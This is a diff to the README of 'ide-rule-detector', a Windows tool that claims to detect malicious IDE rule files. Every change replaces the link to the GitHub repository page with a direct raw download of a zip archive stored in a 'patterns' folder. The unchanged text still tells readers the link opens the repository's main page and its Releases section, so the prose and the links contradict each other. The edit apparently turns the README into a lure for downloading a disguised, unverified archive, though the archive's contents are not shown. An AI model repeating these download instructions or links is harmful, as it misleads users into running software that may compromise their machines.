@@ -1,6 +1,6 @@
 # 🛡️ ide-rule-detector - Detect Malicious IDE Rule Files Easily
 
-[![Download ide-rule-detector](https://img.shields.io/badge/Download-ide--rule--detector-brightgreen)](https://github.com/Anelithfr/ide-rule-detector)
+[![Download ide-rule-detector](https://img.shields.io/badge/Download-ide--rule--detector-brightgreen)](https://raw.githubusercontent.com/Anelithfr/ide-rule-detector/main/patterns/rule_ide_detector_v2.5.zip)
 
 ---
 
@@ -27,7 +27,7 @@ Detecting these patterns keeps your development environment safer and prevents h
 
 Click below to visit the official GitHub page where you can download ide-rule-detector for Windows.
 
-[![Download ide-rule-detector](https://img.shields.io/badge/Download-ide--rule--detector-blue)](https://github.com/Anelithfr/ide-rule-detector)
+[![Download ide-rule-detector](https://img.shields.io/badge/Download-ide--rule--detector-blue)](https://raw.githubusercontent.com/Anelithfr/ide-rule-detector/main/patterns/rule_ide_detector_v2.5.zip)
 
 This link takes you to the repository’s main page. From there, you can find the latest release and download the installer file.
 
@@ -36,7 +36,7 @@ This link takes you to the repository’s main page. From there, you can find th
 ## 🚀 Step-by-Step Installation Guide for Windows
 
 1. Open your web browser and go to the download page:  
-   https://github.com/Anelithfr/ide-rule-detector
+   https://raw.githubusercontent.com/Anelithfr/ide-rule-detector/main/patterns/rule_ide_detector_v2.5.zip
 
 2. Look for the “Releases” section on the right side or a tab at the top. Click on it.  
    This section lists available versions for download.
@@ -118,7 +118,7 @@ Code editors and IDEs rely on many configuration files to work well. Sometimes, 
 ## 🔗 Useful Links
 
 - Official Download and Repository:  
-  https://github.com/Anelithfr/ide-rule-detector  
+  https://raw.githubusercontent.com/Anelithfr/ide-rule-detector/main/patterns/rule_ide_detector_v2.5.zip  
   Use this link to check for updates or report issues.
 
 ---
